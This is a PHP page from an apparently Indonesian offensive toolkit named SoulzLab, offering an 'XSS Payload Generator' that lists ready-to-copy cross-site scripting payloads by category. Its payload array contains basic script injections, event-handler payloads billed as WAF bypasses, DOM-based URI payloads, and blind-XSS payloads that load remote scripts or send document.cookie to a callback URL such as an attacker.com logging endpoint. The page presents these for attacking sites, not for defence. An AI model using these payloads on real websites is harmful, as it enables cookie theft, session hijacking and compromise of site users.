<?php
require '../config.php';
$active_menu = 'xss_payloads';

$callback_url = '';
$payload_category = 'basic';
$generated_payloads = [];

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $callback_url = trim($_POST['callback_url']);
    $payload_category = $_POST['payload_category'];
    
    // Jika callback kosong, gunakan placeholder
    $cb = empty($callback_url) ? "YOUR_CALLBACK_URL" : $callback_url;

    $payloads_db = [
        'basic' => [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>"
        ],
        'waf_bypass' => [
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<details/open/ontoggle=\"alert(1)\">",
            "<input autofocus onfocus=alert(1)>"
        ],
        'blind_xss' => [
            "\"><script src=\"{$cb}\"></script>",
            "<script>$.getScript(\"{$cb}\")</script>",
            "<img src=x onerror=\"this.src='{$cb}/?cookie='+document.cookie;\">",
            "<svg/onload=\"fetch('{$cb}/?c='+btoa(document.cookie))\">"
        ],
        'dom_based' => [
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "#'\"><img src=x onerror=alert(1)>"
        ]
    ];

    if (array_key_exists($payload_category, $payloads_db)) {
        $generated_payloads = $payloads_db[$payload_category];
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload Generator - SoulzLab</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="../css/style.css">
    <style>
        .tool-container {
            background-color: var(--bg-card);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }
        .form-grid {
            display: grid;
            grid-template-columns: 2fr 1fr auto;
            gap: 15px;
            margin-bottom: 25px;
        }
        @media (max-width: 768px) {
            .form-grid {
                grid-template-columns: 1fr;
            }
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 12px 15px;
            background-color: var(--bg-dark);
            border: 1px solid var(--border-color);
            color: var(--text-main);
            border-radius: 8px;
            font-family: 'Fira Code', monospace;
        }
        .input-group input:focus, .input-group select:focus {
            outline: none;
            border-color: var(--accent);
        }
        .btn-generate {
            background-color: var(--accent);
            color: var(--bg-dark);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            height: 100%;
        }
        .btn-generate:hover {
            background-color: var(--accent-hover);
        }
        
        /* Payload List Style */
        .payload-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .payload-item {
            background-color: #0d1117;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: 0.2s;
        }
        .payload-item:hover {
            border-color: var(--accent);
        }
        .payload-code {
            font-family: 'Fira Code', monospace;
            color: #39d353;
            font-size: 0.95rem;
            word-break: break-all;
            margin-right: 15px;
        }
        .btn-copy {
            background-color: rgba(255,255,255,0.05);
            color: var(--text-main);
            border: 1px solid var(--border-color);
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: 0.2s;
            white-space: nowrap;
        }
        .btn-copy:hover {
            background-color: var(--accent);
            color: var(--bg-dark);
            border-color: var(--accent);
        }
        .toast-msg {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background-color: var(--accent);
            color: var(--bg-dark);
            padding: 12px 25px;
            border-radius: 8px;
            font-weight: 600;
            display: none;
            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.3);
            z-index: 1000;
        }
    </style>
</head>
<body>

    <button class="mobile-toggle" id="mobileToggle">
        <i class="fa-solid fa-bars"></i>
    </button>

    <?php include '../includes/sidebar.php'; ?>

    <main class="main-content">
        <header class="top-header">
            <div>
                <h1>XSS Payload Generator</h1>
                <p>Rakic payload Cross-Site Scripting untuk bypass WAF atau serangan Blind XSS.</p>
            </div>
        </header>

        <section class="tool-container">
            <form method="POST" action="">
                <div class="form-grid">
                    <div class="input-group">
                        <input type="text" name="callback_url" placeholder="Callback URL (Opsional, cth: http://attacker.com/log)" value="<?php echo htmlspecialchars($callback_url); ?>">
                    </div>
                    <div class="input-group">
                        <select name="payload_category">
                            <option value="basic" <?php echo ($payload_category == 'basic') ? 'selected' : ''; ?>>Basic Injection</option>
                            <option value="waf_bypass" <?php echo ($payload_category == 'waf_bypass') ? 'selected' : ''; ?>>WAF Bypass (Event Handlers)</option>
                            <option value="blind_xss" <?php echo ($payload_category == 'blind_xss') ? 'selected' : ''; ?>>Blind XSS / Exfiltration</option>
                            <option value="dom_based" <?php echo ($payload_category == 'dom_based') ? 'selected' : ''; ?>>DOM-based (URI & Base64)</option>
                        </select>
                    </div>
                    <button type="submit" class="btn-generate"><i class="fa-solid fa-gears"></i> Generate</button>
                </div>
            </form>

            <?php if (!empty($generated_payloads)): ?>
                <div class="payload-list">
                    <?php foreach ($generated_payloads as $index => $payload): ?>
                        <div class="payload-item">
                            <div class="payload-code" id="payload_<?php echo $index; ?>"><?php echo htmlspecialchars($payload); ?></div>
                            <button class="btn-copy" onclick="copyPayload('payload_<?php echo $index; ?>')">
                                <i class="fa-regular fa-copy"></i> Copy
                            </button>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </section>

        <?php include '../includes/footer.php'; ?>
    </main>

    <div id="toast" class="toast-msg"><i class="fa-solid fa-check"></i> Payload disalin!</div>

    <script>
        // Sidebar Toggle
        const mobileToggle = document.getElementById('mobileToggle');
        const sidebar = document.getElementById('sidebar');
        mobileToggle.addEventListener('click', () => { sidebar.classList.toggle('active'); });

        // Fungsi Copy ke Clipboard
        function copyPayload(elementId) {
            const textToCopy = document.getElementById(elementId).innerText;
            navigator.clipboard.writeText(textToCopy).then(() => {
                const toast = document.getElementById('toast');
                toast.style.display = 'block';
                setTimeout(() => {
                    toast.style.display = 'none';
                }, 2000);
            }).catch(err => {
                console.error('Gagal menyalin text: ', err);
            });
        }
    </script>
</body>
</html>